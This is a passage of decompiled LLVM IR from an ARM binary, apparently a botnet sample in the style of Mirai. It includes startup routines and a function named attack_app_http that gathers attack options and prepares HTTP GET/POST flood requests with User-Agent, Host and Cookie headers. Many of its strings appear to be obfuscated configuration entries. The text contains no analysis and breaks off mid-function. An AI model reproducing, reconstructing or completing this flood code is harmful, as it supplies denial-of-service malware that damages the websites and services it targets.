source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%anon_struct_4 = type { i32, i32*, i8, i8 }
%anon_struct_13 = type { i32, i32*, i8, i8 }
%anon_struct_13.3 = type { i32, i32*, i8, i8 }
%vfp_regs = type { [16 x i64], i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_23374.22 = global i32 0
@global_var_e9fc.26 = constant i32 -382906384
@global_var_1a778.29 = constant [4 x i8] c"GET\00"
@global_var_1a77c.31 = constant i32 47
@global_var_15720.34 = constant i32 -450904024
@global_var_10000.35 = constant i32 -443219956
@global_var_ffff.36 = constant [3 x i8] c"\0A\0C\00"
@global_var_1a770.38 = constant i32 32
@global_var_1a748.40 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_1a760.42 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_1a76c.44 = constant [3 x i8] c"\0D\0A\00"
@global_var_1a780.46 = constant [9 x i8] c"Cookie: \00"
@global_var_1a78c.48 = constant [3 x i8] c"; \00"
@global_var_1a798.50 = constant i32 59
@global_var_1a790.52 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_1a79c.54 = constant [5 x i8] c"http\00"
@global_var_1a7a4.56 = constant [5 x i8] c"url=\00"
@global_var_1a7ac.58 = constant [5 x i8] c"POST\00"
@global_var_1a7b4.60 = constant i32 39
@global_var_118cc.61 = constant i32 -439279616
@global_var_1aab0.63 = constant i32 61
@global_var_1445c.64 = constant i32 -382909968
@global_var_a328.65 = constant i32 144788
@global_var_23598.68 = global i32 0
@global_var_d248.74 = constant i32 -382906384
@global_var_d6b4.76 = constant i32 -382906384
@global_var_c9bc.78 = constant i32 -382906384
@global_var_c2e4.80 = constant i32 -382906384
@global_var_bbc0.82 = constant i32 -382906384
@global_var_b394.84 = constant i32 -382906384
@global_var_ad34.86 = constant i32 -382906384
@global_var_a66c.88 = constant i32 -382906384
@global_var_81d0.90 = constant i32 -382906384
@global_var_260b8.92 = global i32 0
@global_var_d244.97 = constant i32 155832
@global_var_2359c.103 = global i32 0
@global_var_260bc.107 = local_unnamed_addr global i32 0
@global_var_235a0.109 = global i32 0
@global_var_e764.112 = constant i32 -382910448
@global_var_23428.114 = global i32 72544
@global_var_260c4.118 = local_unnamed_addr global i32 0
@global_var_260c2.119 = local_unnamed_addr global i32 0
@global_var_23420.121 = global i32 -1
@global_var_235a4.126 = global i32 0
@global_var_1a7b8.134 = constant i32 10
@global_var_23424.136 = global i32 -1
@global_var_11b60.141 = constant i32 -382910352
@global_var_1a7bc.145 = constant i32 16777216
@global_var_235ac.147 = global i32 0
@global_var_235b8.149 = global i32 0
@global_var_235b0.151 = global i32 0
@global_var_235b4.153 = global i32 0
@global_var_260d8.163 = global i32 0
@global_var_235f0.165 = global i32 0
@global_var_235bc.167 = global i32 0
@global_var_235e8.169 = global i32 0
@global_var_260d0.176 = global i32 0
@global_var_260d4.178 = global i32 0
@global_var_235c2.181 = local_unnamed_addr global i32 0
@global_var_235d4.183 = global i32 0
@global_var_235c8.185 = local_unnamed_addr global i32 0
@global_var_235c4.186 = local_unnamed_addr global i32 0
@global_var_235c9.187 = local_unnamed_addr global i32 0
@global_var_235e2.190 = local_unnamed_addr global i32 0
@global_var_1a7cc.192 = constant [8 x i8] c"1!%1\229?\00"
@global_var_1a7c4.194 = constant [6 x i8] c"14=9>\00"
@global_var_1a7d4.196 = constant [5 x i8] c" 1##\00"
@global_var_10588.197 = constant i32 108508
@global_var_1a7dc.198 = constant [9 x i8] c"381>75=5\00"
@global_var_1a7e8.200 = constant i32 490349927
@global_var_1a794.202 = constant i32 0
@global_var_1a8c8.204 = constant [5 x i8] c"abcd\00"
@global_var_1a7f8.206 = constant [4 x i8] c"14=\00"
@global_var_1a7fc.208 = constant [5 x i8] c"\22??$\00"
@global_var_1a804.210 = constant [5 x i8] c"1>;?\00"
@global_var_1a80c.212 = constant [7 x i8] c"(3ceaa\00"
@global_var_1a814.214 = constant [6 x i8] c"$$>5$\00"
@global_var_1a81c.216 = constant [9 x i8] c"8%>$egei\00"
@global_var_1a828.218 = constant [6 x i8] c"&9*(&\00"
@global_var_1a830.220 = constant [6 x i8] c"abcde\00"
@global_var_1a838.222 = constant [9 x i8] c"a``a389>\00"
@global_var_1a844.224 = constant [8 x i8] c"4561%<$\00"
@global_var_1a84c.226 = constant [4 x i8] c"abc\00"
@global_var_1a850.228 = constant [7 x i8] c"1>$#<!\00"
@global_var_105c8.229 = constant i32 108632
@global_var_1a858.230 = constant [4 x i8] c"e% \00"
@global_var_1a85c.232 = constant [9 x i8] c":%1>$538\00"
@global_var_1a868.234 = constant [6 x i8] c"*<((~\00"
@global_var_1a870.236 = constant [7 x i8] c"abcdef\00"
@global_var_1a878.238 = constant [11 x i8] c"?5<9>%(abc\00"
@global_var_1a884.240 = constant [7 x i8] c"\0A$5eba\00"
@global_var_1a88c.242 = constant i32 490349927
@global_var_1a89c.244 = constant [5 x i8] c"%#5\22\00"
@global_var_1a8a4.246 = constant [7 x i8] c"415=?>\00"
@global_var_1a8ac.248 = constant [4 x i8] c"29>\00"
@global_var_1a8b0.250 = constant [8 x i8] c"#%  ?\22$\00"
@global_var_1a8b8.252 = constant [11 x i8] c"#% 5\22&9#?\22\00"
@global_var_1a8c4.254 = constant [9 x i8] c"*)14abcd\00"
@global_var_235cc.255 = local_unnamed_addr global i32 0
@global_var_235ca.256 = local_unnamed_addr global i32 0
@global_var_235d0.257 = local_unnamed_addr global i32 0
@global_var_235d8.259 = local_unnamed_addr global i32 0
@global_var_235e4.260 = local_unnamed_addr global i32 0
@global_var_f384.262 = constant i32 -382910352
@global_var_1a8d6.265 = constant i32 2096127
@global_var_1a8cd.267 = constant i32 2095871
@global_var_1060c.268 = constant i32 144876
@global_var_260e0.274 = global i32 0
@global_var_23430.277 = global i32 1043935
@global_var_1a8dc.282 = constant i32 39228
@global_var_260f0.283 = local_unnamed_addr global i32 0
@global_var_260f4.284 = local_unnamed_addr global i32 0
@global_var_1a8e0.286 = constant i32 55430
@global_var_26100.287 = local_unnamed_addr global i32 0
@global_var_26104.288 = local_unnamed_addr global i32 0
@global_var_1a8e4.290 = constant i32 1499028601
@global_var_26108.291 = local_unnamed_addr global i32 0
@global_var_2610c.292 = local_unnamed_addr global i32 0
@global_var_1a904.294 = constant i32 1380928786
@global_var_26110.295 = local_unnamed_addr global i32 0
@global_var_26114.296 = local_unnamed_addr global i32 0
@global_var_1a90c.298 = constant i32 1480939538
@global_var_2611c.299 = local_unnamed_addr global i32 0
@global_var_26118.300 = local_unnamed_addr global i32 0
@global_var_1a914.302 = constant i32 1029266194
@global_var_26120.303 = local_unnamed_addr global i32 0
@global_var_26124.304 = local_unnamed_addr global i32 0
@global_var_1a91c.306 = constant i32 1380928786
@global_var_2612c.307 = local_unnamed_addr global i32 0
@global_var_26128.308 = local_unnamed_addr global i32 0
@global_var_1a92c.310 = constant i32 1297895442
@global_var_26130.311 = local_unnamed_addr global i32 0
@global_var_26134.312 = local_unnamed_addr global i32 0
@global_var_1a934.314 = constant i32 1548307986
@global_var_26138.315 = local_unnamed_addr global i32 0
@global_var_2613c.316 = local_unnamed_addr global i32 0
@global_var_1a940.318 = constant i32 1414749203
@global_var_26140.319 = local_unnamed_addr global i32 0
@global_var_26144.320 = local_unnamed_addr global i32 0
@global_var_1a948.322 = constant i32 1380928786
@global_var_26148.323 = local_unnamed_addr global i32 0
@global_var_2614c.324 = local_unnamed_addr global i32 0
@global_var_1a95c.326 = constant i32 1380928786
@global_var_26154.327 = local_unnamed_addr global i32 0
@global_var_26150.328 = local_unnamed_addr global i32 0
@global_var_1a96c.330 = constant i32 1920627327
@global_var_26158.331 = local_unnamed_addr global i32 0
@global_var_2615c.332 = local_unnamed_addr global i32 0
@global_var_1a978.334 = constant i32 1581864978
@global_var_26160.335 = local_unnamed_addr global i32 0
@global_var_26164.336 = local_unnamed_addr global i32 0
@global_var_1a98c.338 = constant i32 1599867994
@global_var_26168.339 = local_unnamed_addr global i32 0
@global_var_2616c.340 = local_unnamed_addr global i32 0
@global_var_1a9a4.342 = constant [9 x i8] c"\5CNNJROY=\00"
@global_var_26170.343 = local_unnamed_addr global i32 0
@global_var_26174.344 = local_unnamed_addr global i32 0
@global_var_1a9b0.346 = constant i32 1264081170
@global_var_26178.347 = local_unnamed_addr global i32 0
@global_var_2617c.348 = local_unnamed_addr global i32 0
@global_var_1a9c0.350 = constant i32 1264081170
@global_var_26180.351 = local_unnamed_addr global i32 0
@global_var_26184.352 = local_unnamed_addr global i32 0
@global_var_1a9d4.354 = constant i32 1264081170
@global_var_26188.355 = local_unnamed_addr global i32 0
@global_var_2618c.356 = local_unnamed_addr global i32 0
@global_var_1a9ec.358 = constant i32 1264081170
@global_var_26194.359 = local_unnamed_addr global i32 0
@global_var_26190.360 = local_unnamed_addr global i32 0
@global_var_1aa08.362 = constant i32 1264081170
@global_var_26198.363 = local_unnamed_addr global i32 0
@global_var_2619c.364 = local_unnamed_addr global i32 0
@global_var_1aa18.366 = constant [7 x i8] c"NUXQQ=\00"
@global_var_261a0.367 = local_unnamed_addr global i32 0
@global_var_261a4.368 = local_unnamed_addr global i32 0
@global_var_1aa20.370 = constant [8 x i8] c"XS\5C_QX=\00"
@global_var_261a8.371 = local_unnamed_addr global i32 0
@global_var_261ac.372 = local_unnamed_addr global i32 0
@global_var_1aa28.374 = constant [8 x i8] c"NDNIXP=\00"
@global_var_261b0.375 = local_unnamed_addr global i32 0
@global_var_261b4.376 = local_unnamed_addr global i32 0
@global_var_1aa30.378 = constant [4 x i8] c"NU=\00"
@global_var_261bc.379 = local_unnamed_addr global i32 0
@global_var_261b8.380 = local_unnamed_addr global i32 0
@global_var_1aa34.382 = constant i32 1398038290
@global_var_261c0.383 = local_unnamed_addr global i32 0
@global_var_261c4.384 = local_unnamed_addr global i32 0
@global_var_1aa4c.386 = constant i32 1499028569
@global_var_261c8.387 = local_unnamed_addr global i32 0
@global_var_261cc.388 = local_unnamed_addr global i32 0
@global_var_1aa6c.390 = constant [10 x i8] c"S^ROOX^I=\00"
@global_var_261d0.391 = local_unnamed_addr global i32 0
@global_var_261d4.392 = local_unnamed_addr global i32 0
@global_var_261d8.393 = local_unnamed_addr global i32 0
@global_var_261dc.394 = local_unnamed_addr global i32 0
@global_var_1aa78.396 = constant [6 x i8] c"RZTS=\00"
@global_var_261e0.397 = local_unnamed_addr global i32 0
@global_var_1aa80.399 = constant [7 x i8] c"XSIXO=\00"
@global_var_261e8.400 = local_unnamed_addr global i32 0
@global_var_1aa88.402 = constant i32 1398038290
@global_var_261f0.403 = local_unnamed_addr global i32 0
@global_var_1aa9c.405 = constant i32 1398038290
@global_var_261f8.406 = local_unnamed_addr global i32 0
@global_var_1aab4.408 = constant i32 1213361769
@global_var_26200.409 = local_unnamed_addr global i32 0
@global_var_1aacc.411 = constant i32 1581864978
@global_var_26208.412 = local_unnamed_addr global i32 0
@global_var_1aae0.414 = constant [12 x i8] c"S\5CPXNXOKXO=\00"
@global_var_26210.415 = local_unnamed_addr global i32 0
@global_var_1aaec.417 = constant i32 1397969534
@global_var_26218.418 = local_unnamed_addr global i32 0
@global_var_1ae10.420 = constant i32 1482579580
@global_var_26220.421 = local_unnamed_addr global i32 0
@global_var_1ae64.423 = constant i32 1482579580
@global_var_26228.424 = local_unnamed_addr global i32 0
@global_var_1ab04.426 = constant i32 1230197374
@global_var_26230.427 = local_unnamed_addr global i32 0
@global_var_1ab38.429 = constant i32 2118735950
@global_var_26238.430 = local_unnamed_addr global i32 0
@global_var_1ab48.432 = constant i32 1331386447
@global_var_26240.433 = local_unnamed_addr global i32 0
@global_var_1ab54.435 = constant i32 1549685329
@global_var_26248.436 = local_unnamed_addr global i32 0
@global_var_1ab60.438 = constant i32 273242190
@global_var_26250.439 = local_unnamed_addr global i32 0
@global_var_1ab70.441 = constant i32 1230197342
@global_var_26258.442 = local_unnamed_addr global i32 0
@global_var_1ab84.444 = constant i32 1398558537
@global_var_26260.445 = local_unnamed_addr global i32 0
@global_var_1ab98.447 = constant [9 x i8] c"^UHSVXY=\00"
@global_var_26268.448 = local_unnamed_addr global i32 0
@global_var_1aaf8.450 = constant i32 1297635414
@global_var_26270.451 = local_unnamed_addr global i32 0
@global_var_1aba4.453 = constant i32 1397969502
@global_var_26278.454 = local_unnamed_addr global i32 0
@global_var_1abb4.456 = constant i32 1263491150
@global_var_26280.457 = local_unnamed_addr global i32 0
@global_var_1abc8.459 = constant i32 1263491150
@global_var_26288.460 = local_unnamed_addr global i32 0
@global_var_1abe4.462 = constant i32 1413960304
@global_var_26290.463 = local_unnamed_addr global i32 0
@global_var_1ac58.465 = constant i32 1413960304
@global_var_26298.466 = local_unnamed_addr global i32 0
@global_var_1accc.468 = constant i32 1413960304
@global_var_262a0.469 = local_unnamed_addr global i32 0
@global_var_1ad1c.471 = constant i32 1413960304
@global_var_262a8.472 = local_unnamed_addr global i32 0
@global_var_1ad90.474 = constant i32 1413960304
@global_var_262b0.475 = local_unnamed_addr global i32 0
@global_var_262b8.476 = local_unnamed_addr global i32 0
@global_var_262c0.477 = local_unnamed_addr global i32 0
@global_var_262c8.478 = local_unnamed_addr global i32 0
@global_var_1ae04.480 = constant [11 x i8] c"YKOuXQMXO=\00"
@global_var_262d0.481 = local_unnamed_addr global i32 0
@global_var_23378.488 = global i32 0
@global_var_12698.509 = constant i32 -443088884
@global_var_10b4c.516 = constant i32 -476053471
@global_var_10af0.518 = constant i32 -509607926
@global_var_12b2c.527 = constant i32 -456978431
@global_var_1070c.536 = constant i32 -481165277
@global_var_101f4.564 = constant i32 -481099741
@global_var_1341c.573 = constant i32 -478871519
@global_var_13ec0.590 = constant i32 -478805983
@global_var_142a8.600 = constant i32 -382906384
@global_var_161a0.609 = constant i32 -442544040
@global_var_14a2c.629 = constant i32 -369098502
@global_var_15400.643 = constant i32 -382910288
@global_var_155b0.655 = constant i32 -2020859901
@global_var_1569c.659 = constant i32 -494075872
@global_var_12544.660 = constant i32 -382910336
@global_var_26660.663 = local_unnamed_addr global i32 0
@global_var_146d8.676 = constant i32 -442543860
@global_var_12a90.684 = constant i32 -369093278
@global_var_16698.711 = constant i32 -382910352
@global_var_cfd0.718 = constant i32 167772243
@global_var_17aa8.736 = constant i32 -382906384
@global_var_17568.764 = constant i32 -382910448
@global_var_18f58.765 = constant i32 -382909968
@global_var_a41c.817 = constant i32 -509607928
@global_var_19694.827 = constant i32 -481296376
@global_var_1978c.828 = constant i32 -481296376
@global_var_19810.829 = constant i32 -369098732
@global_var_9a10.831 = constant i32 -481099661
@global_var_23578.12 = external global i8*
@global_var_23594.66 = external global i8*
@global_var_23595.72 = global i8 0
@global_var_260c0.116 = global i16* null
@1 = internal constant [2 x i8] c"\01\00"
@global_var_2342c.123 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_235a8.139 = external global i8*
@global_var_235ec.171 = global i16* null
@global_var_235c0.180 = external global i8*
@global_var_235e0.184 = local_unnamed_addr global i8 0
@global_var_235d6.188 = local_unnamed_addr global i16 0
@global_var_235e1.189 = local_unnamed_addr global i8 0
@global_var_233d0.483 = local_unnamed_addr global i16 8

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80d8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80d8)
  %v31_80e0 = load i32, i32* @r0, align 4
  ret i32 %v31_80e0
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_80f0 = load i32, i32* @r4, align 4
  store i32 %v3_80f0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_23578.12 to i32), i32* %r4.global-to-local, align 4
  %v2_80f8 = load i8, i8* bitcast (i8** @global_var_23578.12 to i8*), align 4
  %v2_80fc = icmp eq i8 %v2_80f8, 0
  br i1 %v2_80fc, label %dec_label_pc_8104, label %dec_label_pc_8120

dec_label_pc_8104:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_811c = load i32, i32* %r4.global-to-local, align 4
  %v3_811c = inttoptr i32 %v2_811c to i8*
  store i8 1, i8* %v3_811c, align 1
  %v2_8120.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8120

dec_label_pc_8120:                                ; preds = %entry, %dec_label_pc_8104
  %v2_8120 = phi i32 [ %v3_80f0, %entry ], [ %v2_8120.pre, %dec_label_pc_8104 ]
  store i32 %v2_8120, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_23578.12, { 1, 0 }
  uselistorder label %dec_label_pc_8120, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8158 = load i32, i32* @global_var_23374.22, align 4
  %v2_815c = icmp eq i32 %v2_8158, 0
  br i1 %v2_815c, label %dec_label_pc_8174, label %dec_label_pc_8164

dec_label_pc_8164:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8174

dec_label_pc_8174:                                ; preds = %bb, %dec_label_pc_8164
  ret i32 ptrtoint (i32* @global_var_23374.22 to i32)

; uselistorder directives
  uselistorder i32* @global_var_23374.22, { 1, 0 }
  uselistorder label %dec_label_pc_8174, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @fp, align 4
  %v4_819c = ptrtoint i32* %stack_var_4 to i32
  %v8_81bc = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_e9fc.26 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32980, i32 108328, i32 %arg1, i32 %v4_819c)
  %v0_81c0 = call i32 @abort()
  ret i32 %v0_81c0
}

define i32 @attack_app_http(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-44 = alloca i8*, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-10572 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-20813 = alloca i32, align 4
  %v3_81d0 = load i32, i32* @r4, align 4
  %v18_81d0 = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v5_81fc = inttoptr i32 %arg4 to i32*
  %v6_81fc = call i32 @attack_get_opt_str(i32 %arg3, i32* %v5_81fc, i32 20, i32 0, i32 %arg2)
  %v0_8200 = load i32, i32* @r5, align 4
  store i32 %v0_8200, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  %v0_820c = load i32, i32* @r4, align 4
  store i32 %v0_820c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1a778.29 to i32), i32* %r3.global-to-local, align 4
  %v6_8214 = inttoptr i32 %v0_8200 to i32*
  %v7_8214 = call i32 @attack_get_opt_str(i32 %v0_820c, i32* %v6_8214, i32 19, i32 ptrtoint ([4 x i8]* @global_var_1a778.29 to i32), i32 %v6_81fc)
  %v0_8218 = load i32, i32* @r5, align 4
  store i32 %v0_8218, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v7_8214, i32* @sb, align 4
  %v0_8228 = load i32, i32* @r4, align 4
  store i32 %v0_8228, i32* %r0.global-to-local, align 4
  %v5_822c = inttoptr i32 %v0_8218 to i32*
  %v6_822c = call i32 @attack_get_opt_str(i32 %v0_8228, i32* %v5_822c, i32 8, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v0_8230 = load i32, i32* @r5, align 4
  store i32 %v0_8230, i32* %r1.global-to-local, align 4
  store i32 %v6_822c, i32* @sl, align 4
  store i32 21, i32* %r2.global-to-local, align 4
  %v0_823c = load i32, i32* @r4, align 4
  store i32 %v0_823c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a77c.31 to i32), i32* %r3.global-to-local, align 4
  %v5_8244 = inttoptr i32 %v0_8230 to i32*
  %v6_8244 = call i32 @attack_get_opt_str(i32 %v0_823c, i32* %v5_8244, i32 21, i32 ptrtoint (i32* @global_var_1a77c.31 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8248 = load i32, i32* @r5, align 4
  store i32 %v0_8248, i32* %r1.global-to-local, align 4
  store i32 %v6_8244, i32* @r8, align 4
  store i32 23, i32* %r2.global-to-local, align 4
  %v0_8254 = load i32, i32* @r4, align 4
  store i32 %v0_8254, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_825c = inttoptr i32 %v0_8248 to i32*
  %v5_825c = call i32 @attack_get_opt_int(i32 %v0_8254, i32* %v4_825c, i32 23, i32 1)
  %v0_8260 = load i32, i32* @r5, align 4
  store i32 %v0_8260, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  store i32 %v5_825c, i32* @r6, align 4
  %v0_8270 = load i32, i32* @r4, align 4
  store i32 %v0_8270, i32* %r0.global-to-local, align 4
  %v4_8274 = inttoptr i32 %v0_8260 to i32*
  %v5_8274 = call i32 @attack_get_opt_int(i32 %v0_8270, i32* %v4_8274, i32 7, i32 80)
  %v2_827c = ptrtoint i32* %stack_var_-20813 to i32
  %v3_8284 = mul i32 %v5_8274, 65536
  store i32 %v3_8284, i32* %r3.global-to-local, align 4
  %tmp169 = bitcast i32* %stack_var_-20813 to i8*
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  store i32 10241, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8298 = urem i32 %v5_8274, 65536
  store i32 %v3_8298, i32* @r7, align 4
  %v4_829c = call i32 @__GI_memset(i8* %tmp169, i32 0, i32 10241)
  store i32 %v4_829c, i32* %r0.global-to-local, align 4
  %v0_82a0 = load i32, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_82a0 = icmp eq i32 %v0_82a0, 0
  store i1 %v2_82a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_82a0, label %.thread15, label %bb

bb:                                               ; preds = %entry
  %v1_82a4 = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_82a4 = icmp eq i32 %v1_82a4, 0
  store i1 %v3_82a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_82a4, label %bb170, label %dec_label_pc_82c4

.thread15:                                        ; preds = %entry
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_82b4

bb170:                                            ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_82b4

dec_label_pc_82b4:                                ; preds = %bb170, %dec_label_pc_82e4, %.thread15, %dec_label_pc_82d4, %dec_label_pc_82c4
  %v1_82c0 = phi i32 [ %v2_82e8, %dec_label_pc_82e4 ], [ %v4_829c, %.thread15 ], [ %v4_829c, %bb170 ], [ %v2_82d8, %dec_label_pc_82d4 ], [ %v2_82c8, %dec_label_pc_82c4 ]
  store i32 %v3_81d0, i32* %r4.global-to-local, align 4
  store i32 %v18_81d0, i32* %sb.global-to-local, align 4
  ret i32 %v1_82c0

dec_label_pc_82c4:                                ; preds = %bb
  store i32 0, i32* @r4, align 4
  store i32 %v0_82a0, i32* %r0.global-to-local, align 4
  %v1_82c8 = inttoptr i32 %v0_82a0 to i8*
  %v2_82c8 = call i32 @util_strlen(i8* %v1_82c8)
  store i32 %v2_82c8, i32* %r0.global-to-local, align 4
  %v2_82cc = icmp ugt i32 %v2_82c8, 254
  store i1 %v2_82cc, i1* %cpsr_c.global-to-local, align 1
  %v7_82cc = icmp eq i32 %v2_82c8, 255
  store i1 %v7_82cc, i1* %cpsr_z.global-to-local, align 1
  %v8_82d0 = icmp sgt i32 %v2_82c8, 255
  br i1 %v8_82d0, label %dec_label_pc_82b4, label %dec_label_pc_82d4

dec_label_pc_82d4:                                ; preds = %dec_label_pc_82c4
  %v0_82d4 = load i32, i32* @sl, align 4
  store i32 %v0_82d4, i32* %r0.global-to-local, align 4
  %v1_82d8 = inttoptr i32 %v0_82d4 to i8*
  %v2_82d8 = call i32 @util_strlen(i8* %v1_82d8)
  store i32 %v2_82d8, i32* %r0.global-to-local, align 4
  %v2_82dc = icmp ugt i32 %v2_82d8, 126
  store i1 %v2_82dc, i1* %cpsr_c.global-to-local, align 1
  %v7_82dc = icmp eq i32 %v2_82d8, 127
  store i1 %v7_82dc, i1* %cpsr_z.global-to-local, align 1
  %v8_82e0 = icmp sgt i32 %v2_82d8, 127
  br i1 %v8_82e0, label %dec_label_pc_82b4, label %dec_label_pc_82e4

dec_label_pc_82e4:                                ; preds = %dec_label_pc_82d4
  %v0_82e4 = load i32, i32* @sb, align 4
  store i32 %v0_82e4, i32* %r0.global-to-local, align 4
  %v1_82e8 = inttoptr i32 %v0_82e4 to i8*
  %v2_82e8 = call i32 @util_strlen(i8* %v1_82e8)
  store i32 %v2_82e8, i32* %r0.global-to-local, align 4
  %v2_82ec = icmp ugt i32 %v2_82e8, 8
  store i1 %v2_82ec, i1* %cpsr_c.global-to-local, align 1
  %v7_82ec = icmp eq i32 %v2_82e8, 9
  store i1 %v7_82ec, i1* %cpsr_z.global-to-local, align 1
  %v7_82f0 = icmp sgt i32 %v2_82e8, 9
  br i1 %v7_82f0, label %dec_label_pc_82b4, label %bb171

bb171:                                            ; preds = %dec_label_pc_82e4
  %v10_82f0 = ptrtoint i32* %stack_var_-408 to i32
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v8_82f4 = load i32, i32* @r4, align 4
  %v10_82f4 = add i32 %v10_82f0, 364
  %v11_82f4 = inttoptr i32 %v10_82f4 to i32*
  store i32 %v8_82f4, i32* %v11_82f4, align 4
  br label %dec_label_pc_82fc

dec_label_pc_82fc:                                ; preds = %bb171, %bb175
  %v0_82fc = load i32, i32* @sb, align 4
  store i32 %v0_82fc, i32* %r0.global-to-local, align 4
  %v1_8300 = inttoptr i32 %v0_82fc to i8*
  %v2_8300 = call i32 @util_strlen(i8* %v1_8300)
  store i32 %v2_8300, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_8308 = load i8*, i8** %stack_var_-44, align 4
  %v4_8308 = ptrtoint i8* %v3_8308 to i32
  store i32 %v4_8308, i32* %ip.global-to-local, align 4
  %v3_830c = icmp uge i32 %v2_8300, %v4_8308
  store i1 %v3_830c, i1* %cpsr_c.global-to-local, align 1
  %v11_830c = icmp eq i32 %v2_8300, %v4_8308
  store i1 %v11_830c, i1* %cpsr_z.global-to-local, align 1
  %v9_8310 = icmp sgt i32 %v2_8300, %v4_8308
  br i1 %v9_8310, label %dec_label_pc_8314, label %dec_label_pc_8340

dec_label_pc_8314:                                ; preds = %dec_label_pc_82fc
  %v0_8314 = load i32, i32* @sb, align 4
  %v2_8314 = add i32 %v0_8314, %v4_8308
  %v3_8314 = inttoptr i32 %v2_8314 to i8*
  %v4_8314 = load i8, i8* %v3_8314, align 1
  %v6_8314 = zext i8 %v4_8314 to i32
  %v1_8318 = add nsw i32 %v6_8314, -32
  store i32 %v1_8318, i32* %r2.global-to-local, align 4
  %v1_831c = add nsw i32 %v6_8314, -97
  store i32 %v1_831c, i32* %r3.global-to-local, align 4
  %v2_8320 = icmp ugt i32 %v1_831c, 24
  store i1 %v2_8320, i1* %cpsr_c.global-to-local, align 1
  %v7_8320 = icmp eq i32 %v1_831c, 25
